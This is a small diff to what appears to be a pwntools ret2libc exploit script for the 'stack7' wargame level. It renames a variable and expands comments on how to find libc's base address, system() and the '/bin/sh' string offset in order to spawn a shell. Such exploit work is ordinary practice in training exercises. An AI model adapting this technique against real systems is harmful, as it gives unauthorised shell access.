@@ -6,8 +6,8 @@ elf = ELF('./stack7')
 
 libcBase = 0xb7e97000 # (gdb) info proc map ## process must be running
 system = 0xb7ecffb0  # (gdb) p system ## process must be running
-shellOffset = 0x11f3bf # strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
-binsh = libcBase + shellOffset   # These are the addresses in rop
+binshOff = 0x11f3bf # strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh" (offset for string "/bin/sh" in libc)
+binsh = libcBase + binshOff   # This is how you get right address for "/bin/sh"
 
 elf.symbols = {'system': system, 'binsh': binsh}
 
